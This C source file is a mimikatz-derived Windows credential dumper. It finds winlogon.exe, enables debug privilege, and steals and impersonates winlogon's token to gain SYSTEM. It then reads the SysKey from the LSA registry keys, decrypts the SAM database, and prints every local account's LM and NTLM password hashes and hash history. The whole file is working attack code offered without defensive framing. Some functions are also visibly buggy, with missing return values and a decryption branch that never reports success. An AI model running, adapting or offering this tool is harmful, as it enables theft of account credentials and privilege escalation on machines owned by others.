/*
*	Reference: http://github.com/gentilkiwi/mimikatz
*/

#include "samextractor.h"
#include "systemcrypto.h"
#include "crypto.h"

#pragma comment(lib, "cryptdll")

#define SYSKEY_LENGTH 16

const wchar_t* SYSKEY_NAMES[] = { L"JD", L"Skew1", L"GBG", L"Data" };
const BYTE SYSKEY_PERMUT[] = { 11, 6, 7, 1, 8, 10, 14, 0, 3, 5, 2, 15, 13, 9, 12, 4 };
const BYTE QWERTY[] = "!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%";
const BYTE DIGITS[] = "0123456789012345678901234567890123456789";
const BYTE NTPASSWORD[] = "NTPASSWORD";
const BYTE LMPASSWORD[] = "LMPASSWORD";
const BYTE NTPASSWORDHISTORY[] = "NTPASSWORDHISTORY";
const BYTE LMPASSWORDHISTORY[] = "LMPASSWORDHISTORY";

void ExtractSAM();

BOOL GetDebugPrivilege()
{
	BOOL status = FALSE;
	HANDLE hToken;

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		TOKEN_PRIVILEGES tokenPrivs;
		tokenPrivs.PrivilegeCount = 1;
		if (LookupPrivilegeValueW(NULL, SE_DEBUG_NAME, &tokenPrivs.Privileges[0].Luid))
		{
			tokenPrivs.Privileges[0].Attributes = TRUE ? SE_PRIVILEGE_ENABLED : 0;
			if (AdjustTokenPrivileges(hToken, FALSE, &tokenPrivs, sizeof(tokenPrivs), NULL, NULL))
			{
				status = TRUE;
			}
		}
		else wprintf(L"[!] LookupPrivilegeValueW error: %u when get debug privilege.\n", GetLastError());

		CloseHandle(hToken);
	}
	else wprintf(L"[!] OpenProcessToken error: %u when get debug privilege.\n", GetLastError());

	return status;
}

int GetWinlogonPid() {

	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (Process32First(hSnapshot, &entry)) {
		while (Process32Next(hSnapshot, &entry)) {
			if (wcscmp(entry.szExeFile, L"winlogon.exe") == 0) {
				return entry.th32ProcessID;
			}
		}
	}

	CloseHandle(hSnapshot);
	return 0;
}

// steal token of winlogon.exe to get system
BOOL stealToken(DWORD pid)
{
	HANDLE hProcess, hToken, hDupToken;
	STARTUPINFO startupInfo;
	PROCESS_INFORMATION procInfo;


	ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
	ZeroMemory(&procInfo, sizeof(PROCESS_INFORMATION));
	startupInfo.cb = sizeof(STARTUPINFO);

	if (GetDebugPrivilege())
	{
		hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, TRUE, pid);
		if (hProcess)
		{
			wprintf(L"[*] Open process. PID: %d\n", pid);
			if (OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken))
			{
				wprintf(L"[*] OpenProcessToken success.\n");

				if (DuplicateTokenEx(hToken, TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_IMPERSONATE, NULL, SecurityImpersonation, TokenImpersonation, &hDupToken))
				{
					wprintf(L"[*] DuplicateTokenEx.\n");

					if (SetThreadToken(0, hDupToken))
					{
						wprintf(L"[*] SetThreadToken success.\n");
						ExtractSAM();
					}
					else wprintf(L"[!] SetThreadToken error: %u\n", GetLastError());
					
				}
				else wprintf(L"[!] DuplicateTokenEx error: %u\n", GetLastError());


			}
			else wprintf(L"[!] OpenProcessToken error: %u\n", GetLastError());
		}
	}
}


void PrintByteArrToHex(LPBYTE syskey, DWORD length)
{
	DWORD i;

	for (i = 0; i < length; i++)
	{
		wprintf(L"%02x", syskey[i]);
	}
}


void DecryptHash(PBYTE encodedData, DWORD encodedDataSize, DWORD rid, LPCWSTR prefix, BOOL isHistory)
{
	DWORD i;
	BYTE data[LM_NTLM_HASH_LENGTH];

	for (i = 0; i < encodedDataSize; i += LM_NTLM_HASH_LENGTH)
	{
		if (!RtlDecryptNtOwfPwdWithIndex(encodedData + i, &rid, data))
		{
			PrintByteArrToHex(data, LM_NTLM_HASH_LENGTH);
		}
		else wprintf(L"[!] RtlDecryptNtOwfPwdWithIndex error.\n");
	}
}

// decrypt
void GetHashes(PSAM_SENTRY pSamHash, LPBYTE pStart, LPBYTE hashedSyskey, DWORD rid, BOOL isNtlm, BOOL isHistory)
{
	BOOL status = FALSE;
	MD5_CTX md5ctx;
	PSAM_HASH pHash = (PSAM_HASH)(pStart + pSamHash->offset);
	PSAM_HASH_AES pHashAes;
	DATA_KEY keyBuffer = { MD5_DIGEST_LENGTH, MD5_DIGEST_LENGTH, md5ctx.digest };
	CRYPT_BUFFER cypheredHashBuffer = { 0, 0, NULL };
	PVOID out;
	DWORD len;

	if (pSamHash->offset && pSamHash->lenght)
	{
		switch (pHash->Revision)
		{
		case 1:
			if (pSamHash->lenght >= sizeof(SAM_HASH))
			{
				MD5Init(&md5ctx);
				MD5Update(&md5ctx, hashedSyskey, SAM_KEY_DATA_KEY_LENGTH);
				MD5Update(&md5ctx, &rid, sizeof(DWORD));
				MD5Update(&md5ctx, isNtlm ? (isHistory ? NTPASSWORDHISTORY : NTPASSWORD) : (isHistory ? LMPASSWORDHISTORY : LMPASSWORD), isNtlm ? (isHistory ? sizeof(NTPASSWORDHISTORY) : sizeof(NTPASSWORD)) : (isHistory ? sizeof(LMPASSWORDHISTORY) : sizeof(LMPASSWORD)));
				MD5Final(&md5ctx);
				cypheredHashBuffer.Length = cypheredHashBuffer.MaximumLength = pSamHash->lenght - FIELD_OFFSET(SAM_HASH, data);
				if (cypheredHashBuffer.Buffer = (PBYTE)LocalAlloc(LPTR, cypheredHashBuffer.Length))
				{
					RtlCopyMemory(cypheredHashBuffer.Buffer, pHash->data, cypheredHashBuffer.Length);
					if (RtlDecryptData2(&cypheredHashBuffer, &keyBuffer))
						wprintf(L"RtlDecryptData2\n");
				}
			}
			break;
		case 2:
			pHashAes = (PSAM_HASH_AES)pHash;
			if (pHashAes->dataOffset >= SAM_KEY_DATA_SALT_LENGTH)
			{
				if (AES128Decrypt(hashedSyskey, pHashAes->Salt, pHashAes->data, pSamHash->lenght - FIELD_OFFSET(SAM_HASH_AES, data), &out, &len))
				{
					cypheredHashBuffer.Length = cypheredHashBuffer.MaximumLength = len;
					if (cypheredHashBuffer.Buffer = (PBYTE)LocalAlloc(LPTR, cypheredHashBuffer.Length))
					{
						RtlCopyMemory(cypheredHashBuffer.Buffer, out, len);
						status = TRUE;
					}
					LocalFree(out);
				}
			}
			break;
		default:
			wprintf(L"Unknow SAM_HASH revision (%hu)\n", pHash->Revision);
		}
		if (status)
			DecryptHash(cypheredHashBuffer.Buffer, cypheredHashBuffer.Length, rid, isNtlm ? (isHistory ? L"ntlm" : L"NTLM") : (isHistory ? L"lm  " : L"LM  "), isHistory);
		if (cypheredHashBuffer.Buffer)
			LocalFree(cypheredHashBuffer.Buffer);
	}
	return status;
}

// get hashedsyskey
LPBYTE GetHashedSyskey(LPBYTE syskey, LPBYTE hashedSyskey)
{
	LSTATUS status;
	HKEY hAccount;
	MD5_CTX md5ctx;
	DATA_KEY key = { MD5_DIGEST_LENGTH, MD5_DIGEST_LENGTH, md5ctx.digest };
	PSAM_KEY_DATA_AES pAesKey;
	PDOMAIN_ACCOUNT_F pDomAccF = NULL;
	PVOID out;
	DWORD len;

	
	status = RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SAM\\SAM\\Domains\\Account", 0, KEY_READ, &hAccount);
	
	if (status == ERROR_SUCCESS)
	{
		DWORD szNeeded = 0;
		status = RegQueryValueExW(hAccount, L"F", NULL, NULL, NULL, &szNeeded);
		if (status == ERROR_SUCCESS)
		{
			
			if (szNeeded)
			{
				if (pDomAccF = LocalAlloc(LPTR, szNeeded))
				{
					status = RegQueryValueEx(hAccount, L"F", NULL, NULL, (LPBYTE)pDomAccF, &szNeeded);
					if (status != ERROR_SUCCESS)
					{
						wprintf(L"[!] Open SAM\\SAM\\Domains\\Account F error.\n");
					}
				}
			}
		}
	}
	switch (pDomAccF->Revision)
	{
	case 2:
	case 3:
		switch (pDomAccF->keys1.Revision)
		{
		case 1:
			MD5Init(&md5ctx);
			MD5Update(&md5ctx, pDomAccF->keys1.Salt, SAM_KEY_DATA_SALT_LENGTH);
			MD5Update(&md5ctx, QWERTY, sizeof(QWERTY));
			MD5Update(&md5ctx, syskey, SYSKEY_LENGTH);
			MD5Update(&md5ctx, DIGITS, sizeof(DIGITS));
			MD5Final(&md5ctx);
			if (hashedSyskey = LocalAlloc(LPTR, SAM_KEY_DATA_KEY_LENGTH))
			{
				CRYPT_BUFFER data = { SAM_KEY_DATA_KEY_LENGTH, SAM_KEY_DATA_KEY_LENGTH, hashedSyskey };
				RtlCopyMemory(hashedSyskey, pDomAccF->keys1.Key, SAM_KEY_DATA_KEY_LENGTH);
				if (RtlDecryptData2(&data, &key))
					wprintf(L"[!] RtlDecryptData2 error.\n");
			}
			
			break;
		case 2:
			pAesKey = (PSAM_KEY_DATA_AES)&pDomAccF->keys1;
			if (AES128Decrypt(syskey, pAesKey->Salt, pAesKey->data, pAesKey->DataLen, &out, &len))
			{
				if (status = (len == SAM_KEY_DATA_KEY_LENGTH))
					RtlCopyMemory(hashedSyskey, out, SAM_KEY_DATA_KEY_LENGTH);
				LocalFree(out);
			}
			break;
		default:
			wprintf(L"[!] error messsage\n");
		}
		break;
	default:
		wprintf(L"[!] error message\n");
	}
	LocalFree(pDomAccF);

	wprintf(L"[*] Hashed SysKey: ");
	PrintByteArrToHex(hashedSyskey, SYSKEY_LENGTH);
	wprintf(L"\n\n");

	return hashedSyskey;
}

// get syskey
VOID GetSyskey(LPBYTE syskey)
{
	HKEY hLSA, hKey;
	DWORD i;
	BOOL flag = TRUE;
	wchar_t buffer[8 + 1];
	DWORD szBuffer;
	BYTE buffKey[SYSKEY_LENGTH];

	LSTATUS status = RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\Lsa", 0, KEY_READ, &hLSA);

	for (i = 0; (i < ARRAYSIZE(SYSKEY_NAMES)) && flag; i++)
	{
		flag = FALSE;
		status = RegOpenKeyExW(hLSA, SYSKEY_NAMES[i], 0, KEY_READ, &hKey);
		if (status == ERROR_SUCCESS)
		{
			szBuffer = 8 + 1;
			status = RegQueryInfoKeyW(hKey, buffer, &szBuffer, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
			if (status == ERROR_SUCCESS)
			{
				flag = swscanf_s(buffer, L"%x", (DWORD*)&buffKey[i * sizeof(DWORD)]) != -1;
			}
			RegCloseKey(hKey);
		}
	}

	if (flag)
	{
		for (i = 0; i < SYSKEY_LENGTH; i++)
		{
			syskey[i] = buffKey[SYSKEY_PERMUT[i]];
		}
	}

	wprintf(L"[*] SysKey: ");
	PrintByteArrToHex(syskey, SYSKEY_LENGTH);
	wprintf(L"\n");
}

void PrintUsername(wchar_t* pUser, DWORD size)
{
	wchar_t* userName;
	if (userName = LocalAlloc(LPTR, size + 2))
	{
		// wprintf(L"%d\n", size);
		ZeroMemory(userName, size + 2);
		RtlCopyMemory(userName, pUser, size);
	}

	wprintf(L"Username: %s\n", userName);
}

void ExtractSAM()
{
	BYTE syskey[SYSKEY_LENGTH];
	BYTE hashedSyskey[SAM_KEY_DATA_KEY_LENGTH];
	GetSyskey(syskey);
	// PrintByteArrToHex(syskey, SYSKEY_LENGTH);
	GetHashedSyskey(syskey, hashedSyskey);
	// PrintByteArrToHex(hashedSyskey, SYSKEY_LENGTH);
	DWORD i, subkeyNum, szMaxSubKeyLen, szUser, rid, szNeeded;
	wchar_t* user;
	HKEY hUsers, hUser;
	PUSER_ACCOUNT_V pUAv = NULL;

	LSTATUS status = RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SAM\\SAM\\Domains\\Account\\Users", 0, KEY_READ, &hUsers);

	if (status == ERROR_SUCCESS)
	{
		status = RegQueryInfoKeyW(hUsers, NULL, NULL, NULL, &subkeyNum, &szMaxSubKeyLen, NULL, NULL, NULL, NULL, NULL, NULL);
		if (status == ERROR_SUCCESS)
		{
			szMaxSubKeyLen++;
			if (user = (wchar_t*)LocalAlloc(LPTR, (szMaxSubKeyLen + 1) * sizeof(wchar_t)))
			{
				for (i = 0; i < subkeyNum; i++)
				{
					szUser = szMaxSubKeyLen;
					status = RegEnumKeyExW(hUsers, i, user, &szUser, NULL, NULL, NULL, NULL);
					if (status == ERROR_SUCCESS)
					{
						if (_wcsicmp(user, L"Names"))
						{
							if (swscanf_s(user, L"%x", &rid) != -1)
							{
								status = RegOpenKeyExW(hUsers, user, 0, KEY_READ, &hUser);
								if (status == ERROR_SUCCESS)
								{
									status = RegQueryValueExW(hUser, L"V", NULL, NULL, NULL, &szNeeded);
									if (status == ERROR_SUCCESS && szNeeded)
									{
										if (pUAv = LocalAlloc(LPTR, szNeeded))
										{
											status = RegQueryValueExW(hUser, L"V", NULL, NULL, (LPBYTE)pUAv, &szNeeded);
											if (status == ERROR_SUCCESS)
											{
												//wprintf(L"1\n");
												//wprintf(L"%d\n", pUAv->Username.lenght);
												wprintf(L"RID: %d\n", rid);
												PrintUsername((wchar_t*)(pUAv->datas + pUAv->Username.offset), pUAv->Username.lenght);
												wprintf(L"NTLM Hash: ");

												GetHashes(&pUAv->LMHash, pUAv->datas, hashedSyskey, rid, FALSE, FALSE);
												GetHashes(&pUAv->NTLMHash, pUAv->datas, hashedSyskey, rid, TRUE, FALSE);
												GetHashes(&pUAv->LMHistory, pUAv->datas, hashedSyskey, rid, FALSE, TRUE);
												GetHashes(&pUAv->NTLMHistory, pUAv->datas, hashedSyskey, rid, TRUE, TRUE);


												wprintf(L"\n\n");
												LocalFree(pUAv);
											}
										}
									}
								}
							}
						}
					}
				}
			}

		}
	}
}

int wmain(int argc, wchar_t* argv[])
{
	stealToken(GetWinlogonPid());
	return 0;
}